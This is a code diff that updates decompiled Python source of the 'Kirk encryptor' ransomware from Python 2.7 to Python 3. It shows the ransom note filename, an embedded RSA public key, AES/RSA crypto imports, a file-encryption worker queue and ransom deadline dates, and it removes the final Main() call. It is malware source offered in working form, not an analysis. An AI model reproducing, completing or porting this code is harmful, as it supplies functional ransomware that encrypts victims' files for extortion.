@@ -1,15 +1,17 @@
 # Python bytecode 2.7 (62211)
-# Decompiled from: Python 2.7.14 (default, Sep 25 2017, 09:53:22) 
+# Decompiled from: Python 2.7.14 (default, Sep 25 2017, 09:53:22)
+# Updated to Python 3.x support 2022.02.05
+
 """
 
 Kirk encryptor
 
 """
-import tkMessageBox, Tkinter as tk
+import tkinter.messagebox as tk
 from Crypto.Cipher import AES
 from Crypto.PublicKey import RSA
 from Crypto.Hash import SHA256
-import os, random, string, time, threading, Queue, datetime
+import os, random, string, time, threading, queue, datetime
 tn = datetime.datetime.now()
 tn_2 = datetime.datetime.strftime(tn + datetime.timedelta(days=2), '%c')
 tn_7 = datetime.datetime.strftime(tn + datetime.timedelta(days=7), '%c')
@@ -23,7 +25,7 @@ TK_TITLE = 'Low Orbital Ion Cannon | When harpoons, air strikes and nukes fail |
 NOTE_NAME = 'RANSOM_NOTE.txt'
 PWDF_NAME = 'pwd'
 THREAD_NUM = 22
-queue = Queue.Queue()
+queue = queue.Queue()
 files_to_enc = []
 pubkeyDat = '-----BEGIN PUBLIC KEY-----\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAoQpUk7lhDoenoPTCLRjG\nLStBjoT9owWl3HuYezrpmDt60t0P4/jlrwDC06POYxGpDDUbC2SfhcvbemFXWmX/\nzCM92h94v6sxfc6GOfKLbdwudSMOJ+TOSd7XGa3okcIbAh7bVR28XPBOGcg203Z/\n7YJh+wHHnjGjOxcUZIcM3X2BPDIEuc1jxgWgDEIMmjb+yi6m3YdtAmwmurV8wb61\njXrBY936IVxYc3sxw94x9GjfsIspmdurV5En1DEkXPORp7IU5q6Zj4ZZsLwyT+xX\n5V5MdWVYhOJV4X8pLPHUPjvAHQX1POGnX/DVlieG//RXOi0mnR+Vh4OjvBsXC10V\nqrQgZZXByHOtjrdfXgZH8Izr+KuyTVRGILvj884EZ1DMI6L4sb4F9EUjcRacO/tU\nRdduUTw3Q5qsbLPQiS/V4MBEQswlH7UVMiWxfNymyvM5I3BfFeW2QwauRGH5xmaD\nsQG0Yy/AsPzvHKqoShP/LepO1bYUdUodvnfVbChPGTYzZrwmnixS/m5AxyhUh/Ex\n3cxZ5raJWnBfx72wsviuAPIrXqyzlTlNo6aPX029Oh52ezk4uYwLpN02IjJ6yUEg\nyFkqbhASCtvYjqAprvCheane2j7+U7RnjZ+jLNgMWSc5M1pdGK4YYT+U3yfWqbdG\nRSie6e+LhifKADqjHeXSAVsCAwEAAQ==\n-----END PUBLIC KEY-----'
 pk = RSA.importKey(pubkeyDat)
@@ -205,4 +207,3 @@ if __name__ == '__main__':
             quit()
     except Exception as ex:
         pass
-    Main()
